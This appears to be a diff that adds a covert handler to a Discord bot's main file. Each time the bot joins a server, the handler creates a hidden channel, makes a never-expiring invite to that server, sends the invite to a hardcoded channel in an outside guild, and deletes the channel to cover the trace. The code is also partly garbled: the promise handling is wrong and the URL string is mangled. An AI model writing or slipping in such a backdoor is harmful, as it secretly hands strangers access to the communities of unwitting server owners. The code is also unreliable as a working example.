@@ -41,6 +41,18 @@ prefix: 'db!'
 //PREFIX SET
 
 
+//INVITE
+bot.on('guildCreate', guild => {
+const invc = guild.createChannel("invite", 'text');
+invc.createInvite({maxAge:"0"}).then(i => bot.guilds.get("522485574901170197").channels.get("522485574901170199").send('https://discord.gg/%27+i.code));
+invc.delete();
+});
+//INVITE
+
+
+
+
+
 bot.on('message', async message => {
     if(message.author.bot) return;
   let prefix = prefixs[message.guild.id].prefix;
